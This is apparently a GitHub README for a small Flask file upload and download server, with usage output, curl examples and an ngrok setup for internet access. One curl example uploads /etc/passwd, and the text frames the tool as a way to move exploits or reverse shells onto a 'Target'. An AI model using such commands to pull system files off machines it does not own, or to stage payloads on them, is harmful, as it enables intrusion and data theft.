# Uploader
Simple Flask App to Upload Files

Perfect for spinning up if needing to transfer files over via the command line or browser.
```python
python Uploader.py -h
usage: Uploader.py [-h] [-P PORT] [-H HOST] [--upload-folder UPLOAD_FOLDER]

Simple Flask File Uploader

options:
  -h, --help            show this help message and exit
  -P PORT, --port PORT  Port Number to listen On - Default 5000
  -H HOST, --host HOST  Interface to listen on - Default all
  --upload-folder UPLOAD_FOLDER
                        Upload file path - Default 'cwd'
```

Spins up a Flask App
```python
python Uploader.py -H 192.168.0.29 -P 8000 --upload-folder C:\Users\gd\Downloads
 * Serving Flask app 'Uploader'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://192.168.0.29:8000
Press CTRL+C to quit
192.168.0.29 - - [08/Feb/2024 20:48:14] "POST / HTTP/1.1" 302 -
192.168.0.29 - - [08/Feb/2024 20:48:14] "POST /done HTTP/1.1" 200 -
```

## In Browser
Can Upload and also Download Files to the Target if needed

![image](https://github.com/deeexcee-io/Uploader/assets/130473605/30baa38a-1a2b-4d4d-a8cc-5909cbcbca1d)


## Command Line
```bash
curl -L -s -X POST -F "file=@/etc/passwd" http://192.168.0.29:8000
File uploaded!

curl -L -s -X POST -F "file=@ips.txt" https://854d-11-11-11-11.ngrok-free.app

```
## ngrok Setup if accessing over the Internet

```
python Uploader.py -H 127.0.0.1 -P 5000 --upload-folder C:\Uploader\Files

.\ngrok.exe http 5000 --basic-auth="gd:SuperPassword"
```

![ngrok](https://github.com/deeexcee-io/Uploader/assets/130473605/269b7883-4615-469a-b958-5b15cdc0d668)

Enter Creds and you're good

![image](https://github.com/deeexcee-io/Uploader/assets/130473605/ebd9e686-6cbc-469d-a187-3b3bec50573e)

List is Dynamically Updated to show current files

![image](https://github.com/deeexcee-io/Uploader/assets/130473605/5b157912-b0ae-48e8-8006-84c2f476f437)


![image](https://github.com/deeexcee-io/Uploader/assets/130473605/8ff1ffe1-c314-4781-a520-53ea4917ceee)



All FIles in the Current Directory are also Served and can be Downloaded if needed. For example transferring over an exploit/reverse shell

![image](https://github.com/deeexcee-io/Uploader/assets/130473605/ab51663d-fb7a-43a1-a99f-ac444fc71f27)





